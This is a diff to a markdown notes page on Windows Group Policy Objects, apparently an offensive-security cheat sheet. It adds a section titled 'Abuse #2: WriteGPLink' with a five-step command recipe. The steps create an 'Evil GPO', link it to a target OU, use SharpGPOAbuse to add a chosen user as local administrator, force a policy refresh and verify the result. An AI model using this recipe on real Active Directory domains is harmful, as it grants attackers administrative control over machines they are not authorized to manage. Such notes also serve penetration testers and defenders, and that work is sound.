@@ -1,7 +1,7 @@
 ---
 title: "GPOs"
-date: 2024-8-3
-tags: ["GPOs", "Windows", "Group Policy Objects"]
+date: 2025-3-16
+tags: ["GPOs", "Windows", "Group Policy Objects", "WriteGPLink"]
 ---
 
 ### General
@@ -125,3 +125,35 @@ The command completed successfully.
 ```
 
 <small>*Ref: [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse)*</small>
+
+### Abuse #2: WriteGPLink
+
+#### 1. Create a New GPO
+
+```console
+New-GPO -Name "Evil GPO"
+```
+
+#### 2. Link to Target
+
+```console
+Get-GPO -Name "Evil GPO" | New-GPLink -Target "OU=<TARGET>,DC=<DOMAIN>,DC=<COM>"
+```
+
+#### 3. Add localAdmin
+
+```console
+.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount '<USER>' --GPOName 'Evil GPO'
+```
+
+#### 4. Force reload
+
+```console
+gpupdate /force
+```
+
+#### 5. Check
+
+```console
+net user '<USER>'
+```
